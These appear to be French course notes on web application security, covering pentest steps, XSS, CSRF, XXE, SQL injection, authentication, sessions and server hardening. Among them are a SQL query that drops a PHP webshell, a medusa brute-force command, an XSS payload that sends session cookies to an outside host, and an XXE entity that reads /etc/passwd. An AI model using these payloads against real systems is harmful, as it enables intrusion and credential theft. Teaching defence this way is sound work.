
##Scénarios d'attaque

  - Frontal
  - Man In The Midle (MITM) passif (écoute de flux)
  - Man actif
  - Page malveillante

###Etapes d'un test d'intrusion

  - Recherche passive (Google, Social, Whois)
   - exemple: utilisation du mot clef 'ip' dans Bing


  - Recherche active
   - Exemple
    - ```ip a```
     - ```10.0.0.243```
    - ```nmap -sP 10.0.0.0/24```
     - ```Host is up 10.0.0.21```
    - ```nmap -F 10.0.0.21 -sV```

###Test de mots de passe

 - exemple:

 medusa -h 10.0.0.21 -P passwords.txt -M mysql

###MYSQL

 #### Dépot d'un webshell au moyen d'une requête SQL

 - SELECT '<?php system($_GET['cmd']); ?>' into outfile '/var/www/shell.php';

###Tomcat

 - Accès au tomcat manager grâce à un module metasploit
 - déploiement de 'browser.war'
 - obtention d'un webshell

###Dirbuster (Fuite d'information)

- Reconstruire l'arborescence d'un site web en affichant les permissions

###SQL Injections

 - Outil sqlmap
 - Risques potentiels
  - Fuite des condensats de mots de passe:
    - Rainbow table
    - Usurpation d'identité
    - Rejeu des condensats sur d'autres systèmes

###Faille XSS

  - 2 types
   - Réflexif (injection de JS dans un champs de formulaire non stocké)
   - Stocké (stockage en Base de Donnée de l'injection de code navigateur)

####Exemple de XSS réfelxif

  - Dans un champs de formulaire (non protégé) on entre:
   - ```" "><script>document.write('<img src="http://mon.site.com/"'+document.cookie+'/>');</script>```
   - Le cookie de session est récupéré dans les logs http du site mon.site.com !

  - Prémunition
   - Validation des entrées utilisateur **de bout en bout**
   - HTTPOnly cookies
   - Echappement des chaînes de caractères pertinent dans le contexte d'utilisation des entrées des utilisateurs (LDAP, SQL, XML...)

###Faille CSRF (Cross Resource Request Forgery)

 - Il s'agit de:
  - Identifier une fonctionalité post authenfication sensible
  - Réaliser un formulaire qui crée une requête identique avec des données falsifiées
   - On peut utiliser BURP pour forger la requête

 - Prémunition
   - token csrf pour s'assurer de l'origine de la requête
    - généré côté framework ou par le WAF (exemple mod_security)

###Faille XXE (XML External Entity)

- Il s'agit de:
  - Exécuter du code malveillant qui repose sur l'appel à des entités extérieures dans un document XML
  - Exemple:
   - ```<!DOCTYPE fail [<!ENTITY XXE SYSTEM /etc/passwd>]><foo>&xxe;</foo>```
   - Affiche le contenu du fichier /etc/passwd
  - Prémunition
   - Ne pas autoriser la déclaration de DTD en ligne (configuration du parser)


##Administration d'une plateforme d'hébergement GNU/LINUX

  - Principes de base
    - Moindre privilège
    - Intérractions entre développeur et admmin-système


  - Descente de privilèges
   - Droits d'accès au système de fichiers
   - Attention à l'espace mémoire aloué pour l'application


  - Réduction de la surface d'attaqye

  - Durcissement du socle système (GRSEC, SE LINUX, APP-ARMOR)

###Les biens sensibles d'une application web

 - BDD
 - Code source
 - Performances CPU-RAM
 - Vantage Point (rebond vers le réseau hôte)
 - BDD côté client (HTML5)
 - Fichiers (uploadés ou statiques)
 - Clefs cryptographiques
 - Journaux

###Parties prenantes

 - Utilisateurs anonymes
 - Utilisateurs authentifiés
 - Développeurs
 - Admin Web
 - Admin sys.
 - RSSI

  - **Autant de privilèges à séparer**

###Exemple d'Apache

 - Désactiver les modules inutiles
 - Désactiver des hôtes virtuels non utilisés
 - Rejet par défaut de l'accès aux fichiers
  - Approche **liste blanche**
 - Ajout d'en-tête systématique
  - Exemple: CSRF Token
 - Contrôler la cohérence des requêtes
 - Ne pas s'appuyer sur htaccess

 - Cloisonnement PHP Apache
  - Utiliser une interface CGI plutôt que le module intégré


### Renforcement de configuration

 - Faire bon usage de syslog
 - Modèle W XOR X
  - Le code source n'appartient pas à l'utilisateur qui l'exécute
  - But: empêcher la réécriture de code source

## Authentification

### Généralités

#### Passage d'un canal non authentifié à un canal authentifié

 - 3 phases à distinguer
  - Identification
  - Authentification
  - Autorisation


    Toujours dans cet ordre


####Temps d'exploitation du canal (Session)

 - Clôturée:
  - A l'initiative du demandeur
  - A l'initiative du receveur

### Cas du WEB

####HTTP, protocôle sans états

 - Chaque appel doit être authentifié
  - Pas trop le choix
    - Basic
    - Digest


 - Inconvénients ?
  - Pas de log-out
  - Pas de time-out
  - Faible robustesse du mécanisme de dérivation pour Digest (MD5)


####Authentification de type "Formulaire"

 - Avantages
  - Custom (flexible et sur mesure)

 - Inconvénients
  - Custom (contrôles qualité **obligatoires**)


###A propos des fonctions de calcul de condensats

 - Pas de hashage sans sel
  - Objectif: Empêcher l'utilisation de tables précalculées (rainbow table)

###Dérivation de mots de passe

 - PBKPF2
  - Réitération de la fonction de hashage (1024 fois par exemple)

 - BCRYPT
  - Similaire mais repose sur des algorithmes de chiffrement

 - Attention à la robustesse du socle !
  - Le coût de calcul de l'empreinte augmente

 - Délégation de la dérivation côté client (JS) ?
  - Attention aux vieux terminaux
  - Attention à la crypto en JS (Implémentations non éprouvées)

###Activation de compte

  - Mail|Token|Expires
   - Création d'un token (robuste...)
   - Envoi d'un mail contenant le token
   - Le token a une durée de vie limitée dans le temps


   **Un paquet de données d'activation contient toujours une @mail et un token. Pas plus d'un token possible pour un même compte**

  - Attention à la fuite d'informations
   - Pas de message du type "compte déjà existant" (Brut force)
    - On peut faire un feedback systématique du type "Vous avez reçu un mail d'activation"

###Sessions

 - Client-Side Sessions
  - Stockage des informations de profil (chiffrées) côté client


  - Inconvénient
    - Le serveur perd la capacité de clore la session
    - Exposition au risque de rejeu


 - Cookies de session
   - Information sensible = information robuste
   - Vérifier la méthode de génération de l'ID de session
   - Regénération en cours de session
   - Regénération systématique en cas de réduction ou d'élévation de privilège
   - Ne **jamais** journaliser les id de sessions ad-hoc (appliquer un calcul de condensat)
   - Flags
    - HTTPOnly (protection XSS)
    - Secure (Transit par canal sécurisé uniquement)

 - Expiration de session
   - Ne pas s'appuyer sur le délai d'expiration du cookie
    - La suppression d'informations se fait toujours en base

##Upload de fichier

###Unrestricted File Upload

####Conséquences potentielles

  - Exécution de code arbitraire
   - Webshells
    - C99shell (php)
    - browser.war (java)
    - weevely.py (pyhton)

####Quelques règles pour le développeur

  - Restreindre les extensions de fichiers
  - Restreindre les types de contenus (MIME)
  - Renommer les fichiers uploadés **aléatoirement**
      - Gérer une association ID-Nom de fichier en base de données
  - Créer un accesseur pour servir les fichiers

####Côté serveur

 - Attention aux permissions
 - Directive AllowOverride None

##AJAX - JSON - XML

### XMLHttpResquest

####Limitations

#####La SOP (Same Origin Policy)

  Un cloisonnement de l'environnement d'exécution JS/DOM par domaine ou plus exactement par:

   - scheme (exemple: http) + domaine + port
    - (sauf pour ie qui n'utilise pas le port comme discriminant)


   - Exemples:
    - http://foo.bar.baz ≠ https://foo.bar.baz
    - http://foo.bar.baz:8080 ≠ http://foo.bar.baz

   - Assouplissement de la SOP (méthode propres)
    - CORS (en-tête Access-Control-Allo-Origin)
    - Proxy applicatif (proxyPass) si on a pas la main côté serveur

  **Jamais de requête modifiante en GET**

####JSON

  - Ne jamais interpréter directement un objet JSON fourni par un service externe
  - **Toujours** utiliser un parser
   - Analyse de la donnée fournie en réponse à l'appel
   - Transcodage (JS et JSON ne sont pas en phase sur la partie encodage)
  - Ne jamais fournir directement un tableau en JSON
   - Certains navigateurs permettent de surcharger le constructeur de l'objet tableau pour accéder aux données contenues dans n'importe quel tableau instancié
   - On créera donc un objet de la forme {"data":[1, 2, 4]}
